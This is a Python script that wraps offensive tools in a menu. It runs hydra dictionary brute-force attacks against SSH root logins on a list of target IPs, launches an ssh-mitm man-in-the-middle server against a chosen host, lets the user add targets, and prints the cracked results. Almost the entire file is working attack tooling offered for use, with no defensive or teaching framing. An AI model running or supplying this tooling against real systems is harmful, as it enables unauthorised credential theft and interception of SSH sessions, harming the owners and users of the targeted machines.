import glob
import subprocess
import threading
import sys

loopControl = True
while loopControl:
    user_choice = input(
        "\nSelect option:\n"
        "1. Launch dictionary attack & brute force\n"
        "2. Launch man-in-the-middle attack\n"
        "3. Print targets\n"
        "4. Feed Targets for dict. attack\n"
        "5. Exit \n"
        "6. Print Dict. Attack Outputs"
        "> "
    )

    if user_choice == "1":
        for wordlist in sorted(glob.glob("passwords/hydra_split_*.txt")):
            print(f"\nRunning with {wordlist}...")

            cmd = [
                "hydra",
                "-l", "root",
                "-P", wordlist,
                "-M", "targets/ips.txt",
                "ssh", "-o", "output.txt"
            ]

            with subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            ) as p:
                for line in p.stdout:
                    print(line, end="")
                p.wait()

                print(f"{wordlist} finished with return code {p.returncode}")

    elif user_choice == "2":
        appimage_path = "mitm/./ssh-mitm-x86_64.AppImage"
        mitmChoice = input("TARGET-HOST: ")
        proxyChoice = input("Choose Port (Press Y for Defult 10022):")
        if proxyChoice == "" or proxyChoice.lower() == "y":
            port = "10022"
        else:
            port = proxyChoice
        print("Starting MITIM...on port {port}...")
        command = [appimage_path, "server", "--listen-port",port,"--remote-host", mitmChoice,]
        process = subprocess.Popen(command)

    elif user_choice == "3":
        with open("targets/ips.txt", "r") as f:
            lines = f.readlines()

        ipCount = len(lines)
        content = "".join(lines)

        print(f"Target Count: {ipCount}")
        print(content)

    elif user_choice == "4":
        user_text = input("ENTER TARGET IP WITH SSH:")
        with open("targets/ips.txt", "a") as f:
            f.write(user_text + "\n")
        print("target", user_text, "added")

    elif user_choice == "5":
        print("Exiting program.")
        break
    elif user_choice =="6":
        with open('output.txt','r') as file:
            print(file.read())
    else:
        print("Wrong Input...try again.")
